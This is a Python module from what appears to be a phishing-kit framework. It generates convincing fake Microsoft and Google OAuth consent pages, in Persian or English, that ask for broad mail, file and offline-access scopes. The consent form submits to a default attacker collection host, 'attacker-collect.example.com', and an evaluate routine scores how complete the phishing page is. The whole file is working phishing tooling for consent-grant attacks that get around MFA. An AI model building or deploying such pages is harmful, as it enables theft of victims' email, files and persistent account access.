from __future__ import annotations

from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)


class OAuthPhishingTechnique(BaseTechnique):
    """
    T22 — OAuth consent phishing.

    Generates a realistic-looking OAuth app permission consent page
    that tricks users into granting broad permissions (e.g., mail access)
    to a malicious app, bypassing MFA without needing credentials.
    """

    TECHNIQUE_ID: ClassVar[int] = 22
    TECHNIQUE_NAME: ClassVar[str] = "OAuth Consent Phishing"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.MFA_AUTH_BYPASS
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT, Category.PERSONAL_INFO_HARVESTING]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.ALWAYS]
    DESCRIPTION: ClassVar[str] = (
        "Generates a fake OAuth app consent page requesting broad permissions. "
        "Victim grants access without entering credentials, bypassing MFA. "
        "The attacker gains persistent OAuth token access."
    )
    _MS_GRAPH_SCOPES: ClassVar[list[str]] = [
        "Mail.ReadWrite", "Mail.Send", "offline_access",
        "Calendars.Read", "Contacts.Read",
        "Files.ReadWrite.All", "User.Read",
    ]

    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="app_name",
            description="Name of the fake OAuth app",
            type=str,
            default="DocuSign Online",
        ),
        OptionSpec(
            name="requested_scopes",
            description="OAuth permissions (provider-specific scope identifiers)",
            type=list,
            default=_MS_GRAPH_SCOPES,
        ),
        OptionSpec(
            name="provider",
            description="OAuth provider style: 'microsoft' or 'google'",
            type=str,
            default="microsoft",
        ),
        OptionSpec(
            name="redirect_uri",
            description="Where to redirect after consent (attacker's server)",
            type=str,
            default="https://attacker-collect.example.com/callback",
        ),
    ]

    _SCOPE_LABEL_KEYS: ClassVar[dict[str, str]] = {
        "Mail.ReadWrite":  "scope.mail.readwrite",
        "Mail.Send":       "scope.mail.send",
        "offline_access":  "scope.offline_access",
        "Calendars.Read":  "scope.calendars.read",
        "Contacts.Read":   "scope.contacts.read",
        "Files.ReadWrite.All": "scope.files.readwrite",
        "User.Read":       "scope.user.read",
    }

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        import secrets
        app_name: str = options.get("app_name", "DocuSign Online")
        scopes: list[str] = options.get("requested_scopes", self._MS_GRAPH_SCOPES)
        provider: str = options.get("provider", "microsoft")
        redirect_uri: str = options.get(
            "redirect_uri", "https://attacker-collect.example.com/callback"
        )
        code_challenge = secrets.token_urlsafe(32)

        lang = self._detect_lang(html, url)

        if provider == "google":
            consent_html = self._google_consent(app_name, scopes, redirect_uri, code_challenge, lang)
        else:
            consent_html = self._microsoft_consent(app_name, scopes, redirect_uri, code_challenge, lang)

        self.log("info", "oauth_applied",
                 provider=provider, app=app_name,
                 scopes=len(scopes), pkce=True, lang=lang)

        return ApplyResult(
            modified_html=consent_html,
            modified_url=None,
            extra_files={"oauth_consent_page.html": consent_html.encode()},
            change_log=[
                self._make_change(
                    "oauth_consent_generated",
                    f"Generated {provider} OAuth consent page for '{app_name}' "
                    f"with {len(scopes)} scopes + PKCE",
                    details={
                        "provider": provider,
                        "app_name": app_name,
                        "scope_count": len(scopes),
                        "scopes": scopes,
                        "pkce": True,
                        "redirect_uri": redirect_uri,
                        "lang": lang,
                    },
                )
            ],
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        page_html = html or extra_files.get("oauth_consent_page.html", b"").decode("utf-8", errors="replace")

        import re
        scope_items = re.findall(r'<li[^>]*>.*?</li>', page_html, re.DOTALL)
        if len(scope_items) >= 2:
            signals.append(f"Consent page has {len(scope_items)} scope list item(s)")
        else:
            issues.append(f"Consent page has only {len(scope_items)} scope list item(s) — expected ≥ 2")

        has_accept = any(w in page_html for w in ("btn-accept", "btn-allow", "type=\"submit\""))
        if has_accept:
            signals.append("HTML has accept/allow submit button")
        else:
            issues.append("HTML missing accept/allow button")

        has_cancel = "btn-cancel" in page_html or "window.history.back()" in page_html
        if has_cancel:
            signals.append("HTML has cancel button")
        else:
            issues.append("HTML missing cancel button")

        form_action = re.search(r'<form[^>]+action="([^"]+)"', page_html)
        if form_action:
            action = form_action.group(1)
            if action and action != "#":
                signals.append(f"Form action set to redirect URI: {action[:60]!r}")
            else:
                issues.append("Form action is empty or '#'")
        else:
            issues.append("No <form> with action found")

        entry = next((e for e in change_log if e.change_type == "oauth_consent_generated"), None)
        if entry:
            sc = entry.details.get("scope_count", 0)
            prov = entry.details.get("provider", "")
            if sc >= 1:
                signals.append(f"change_log: provider={prov!r} scope_count={sc}")
            else:
                issues.append("change_log shows 0 scopes")
        else:
            issues.append("No oauth_consent_generated in change_log")

        passed = len(scope_items) >= 1 and has_accept
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"scope_count": len(scope_items), "has_accept": has_accept, "has_form_action": bool(form_action)},
        )

    def _scope_items(self, scopes: list[str], lang: str = "fa") -> str:
        from app.utils.i18n import t as _t
        rows = []
        for scope in scopes:
            key = self._SCOPE_LABEL_KEYS.get(scope)
            label = _t(key, lang) if key else scope
            rows.append(
                f'<li style="padding:6px 0;border-bottom:1px solid #f0f0f0;">'
                f'&#10003; {label} <span style="font-size:11px;color:#888;">({scope})</span></li>'
            )
        return "\n".join(rows)

    def _microsoft_consent(
        self, app_name: str, scopes: list[str], redirect_uri: str, code_challenge: str,
        lang: str = "fa",
    ) -> str:
        from app.utils.i18n import t as _t
        dir_attr = "rtl" if lang == "fa" else "ltr"
        items = self._scope_items(scopes, lang)
        return f"""<!DOCTYPE html>
<html lang="{lang}" dir="{dir_attr}">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>{_t("oauth.ms.title", lang, app_name=app_name)}</title>
  <style>
    body{{font-family:'Segoe UI',Tahoma,-apple-system,Arial,sans-serif;background:#f5f5f5;margin:0;
         display:flex;align-items:center;justify-content:center;min-height:100vh;color:#201f1e;}}
    .card{{background:#fff;padding:44px 44px 36px;max-width:440px;width:100%;border-radius:2px;
           box-shadow:0 2px 6px rgba(0,0,0,.13);}}
    .ms-logo{{color:#737373;font-size:15px;font-weight:600;margin-bottom:24px;letter-spacing:.2px;}}
    .ms-logo b{{display:inline-block;width:12px;height:12px;background:#f25022;margin-{ 'left' if lang == 'fa' else 'right' }:6px;vertical-align:middle;}}
    h2{{font-size:24px;margin-bottom:12px;color:#1b1b1b;font-weight:600;}}
    .subtitle{{font-size:13px;color:#605e5c;margin-bottom:20px;}}
    .app-name{{font-weight:600;color:#201f1e;}}
    ul{{list-style:none;padding:0;margin:0 0 24px;border:1px solid #e1dfdd;border-radius:2px;background:#faf9f8;}}
    li{{padding:10px 16px;font-size:13px;color:#323130;}}
    .btn-accept{{width:100%;background:#0078d4;color:#fff;border:none;
                 padding:10px;font-size:15px;cursor:pointer;border-radius:2px;margin-bottom:8px;}}
    .btn-cancel{{width:100%;background:#fff;color:#0078d4;border:1px solid #8a8886;
                 padding:10px;font-size:15px;cursor:pointer;border-radius:2px;}}
    .notice{{font-size:11px;color:#a19f9d;margin-top:20px;text-align:center;}}
  </style>
</head>
<body>
  <div class="card">
    <div class="ms-logo"><b></b> {"مایکروسافت" if lang == "fa" else "Microsoft"}</div>
    <h2>{_t("oauth.ms.heading", lang)}</h2>
    <p class="subtitle">
      {_t("oauth.ms.instructions", lang, app_name=app_name)}
    </p>
    <ul>{items}</ul>
    <form action="{redirect_uri}" method="POST">
      <input type="hidden" name="code" value="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9">
      <input type="hidden" name="state" value="oauth_state_token">
      <input type="hidden" name="code_challenge" value="{code_challenge}">
      <input type="hidden" name="code_challenge_method" value="S256">
      <button type="submit" class="btn-accept">{_t("form.button.accept", lang)}</button>
    </form>
    <button class="btn-cancel" onclick="window.history.back()">{_t("form.button.cancel", lang)}</button>
    <p class="notice">
      {_t("oauth.ms.footer", lang)}
    </p>
  </div>
</body>
</html>"""

    def _google_consent(
        self, app_name: str, scopes: list[str], redirect_uri: str, code_challenge: str,
        lang: str = "fa",
    ) -> str:
        from app.utils.i18n import t as _t
        dir_attr = "rtl" if lang == "fa" else "ltr"
        items = self._scope_items(scopes, lang)
        google_brand = "گوگل" if lang == "fa" else "Google"
        return f"""<!DOCTYPE html>
<html lang="{lang}" dir="{dir_attr}">
<head>
  <meta charset="UTF-8">
  <title>{_t("oauth.google.title", lang, app_name=app_name)}</title>
  <style>
    body{{font-family:Roboto,Tahoma,Arial,sans-serif;background:#fff;margin:0;
         display:flex;align-items:center;justify-content:center;min-height:100vh;}}
    .card{{width:400px;padding:40px;border:1px solid #dadce0;border-radius:8px;}}
    .g-logo{{color:#4285f4;font-size:22px;font-weight:500;margin-bottom:24px;}}
    h2{{font-size:20px;color:#202124;margin-bottom:8px;}}
    p{{font-size:14px;color:#5f6368;margin-bottom:20px;}}
    ul{{list-style:none;padding:0;margin:0 0 24px;}}
    li{{padding:8px 0;font-size:14px;color:#202124;border-bottom:1px solid #e0e0e0;}}
    .row{{display:flex;justify-content:flex-end;gap:12px;}}
    .btn{{padding:10px 20px;font-size:14px;border-radius:4px;cursor:pointer;border:none;}}
    .btn-cancel{{background:#fff;color:#1a73e8;border:1px solid #dadce0;}}
    .btn-allow{{background:#1a73e8;color:#fff;}}
  </style>
</head>
<body>
  <div class="card">
    <div class="g-logo">G {google_brand}</div>
    <h2>{_t("oauth.google.heading", lang, app_name=app_name)}</h2>
    <p>{_t("oauth.google.instructions", lang, app_name=app_name)}</p>
    <ul>{items}</ul>
    <div class="row">
      <button class="btn btn-cancel" onclick="window.history.back()">{_t("form.button.cancel", lang)}</button>
      <form action="{redirect_uri}" method="POST" style="display:inline;">
        <input type="hidden" name="code" value="4/0AX4XfWi_placeholder_code">
        <input type="hidden" name="scope" value="openid email profile">
        <input type="hidden" name="code_challenge" value="{code_challenge}">
        <input type="hidden" name="code_challenge_method" value="S256">
        <button type="submit" class="btn btn-allow">{_t("form.button.allow", lang)}</button>
      </form>
    </div>
  </div>
</body>
</html>"""
